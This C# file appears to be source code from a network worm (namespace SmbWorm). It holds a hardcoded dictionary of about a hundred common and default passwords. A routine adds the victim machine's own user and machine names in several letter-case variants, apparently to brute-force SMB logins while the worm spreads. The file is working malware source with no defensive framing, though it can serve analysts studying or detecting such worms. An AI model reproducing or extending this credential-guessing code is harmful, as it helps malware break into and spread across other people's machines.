using System;
using System.Collections.Generic;

namespace SmbWorm;

internal class PasswordList
{
	public static string[] passwords = new string[104]
	{
		"admin", "root", "student", "user", "password", "123456", "123456789", "qwerty", "12345678", "111111",
		"12345", "col123456", "123123", "1234567", "1234", "1234567890", "000000", "555555", "666666", "123321",
		"654321", "7777777", "123", "d1lakiss", "777777", "110110jp", "1111", "987654321", "121212", "gizli",
		"abc123", "444444", "333333", "222222", "111111", "2222222", "3333333", "4444444", "5555555", "6666666",
		"7777777", "8888888", "9999999", "0000000", "admin123", "username", "administrator", "account", "********", "*******",
		"******", "112233", "azerty", "159753", "1q2w3e4r", "54321", "222222", "qwertyuiop", "qwerty123", "123654",
		"iloveyou", "a1b2c3", "999999", "groupd2013", "1q2w3e", "Liman1000", "1111111", "333333", "123123123", "9136668099",
		"11111111", "1qaz2wsx", "password1", "mar20lt", "987654321", "gfhjkm", "159357", "131313", "789456", "aaaaaa",
		"88888888", "dragon", "987654", "888888", "master", "12345678910", "1237895", "1234561", "12344321", "daniel",
		"00000", "444444", "101010", "789456123", "super123", "qwer1234", "123456789a", "823477aA", "147258369", "unknown",
		"98765", "q1w2e3r4", "guest", "232323"
	};

	public static void ActivateList()
	{
		List<string> list = new List<string>();
		list.Add(Environment.UserName);
		list.Add(Environment.MachineName);
		list.Add(char.ToUpper(Environment.UserName[0]) + Environment.UserName.Substring(1));
		list.Add(char.ToUpper(Environment.MachineName[0]) + Environment.UserName.Substring(1));
		list.Add(char.ToLower(Environment.UserName[0]) + Environment.UserName.Substring(1));
		list.Add(char.ToLower(Environment.MachineName[0]) + Environment.UserName.Substring(1));
		list.Add(Environment.UserName.ToLower());
		list.Add(Environment.MachineName.ToLower());
		list.Add(Environment.UserName.ToUpper());
		list.Add(Environment.MachineName.ToUpper());
		list.AddRange(passwords);
		string[] array = passwords;
		foreach (string text in array)
		{
			if (!text.StartsWith("0") && !text.StartsWith("1") && !text.StartsWith("2") && !text.StartsWith("3") && !text.StartsWith("4") && !text.StartsWith("5") && !text.StartsWith("6") && !text.StartsWith("7") && !text.StartsWith("8") && !text.StartsWith("9"))
			{
				list.Add(char.ToUpper(text[0]) + text.Substring(1));
			}
		}
		passwords = list.ToArray();
	}
}
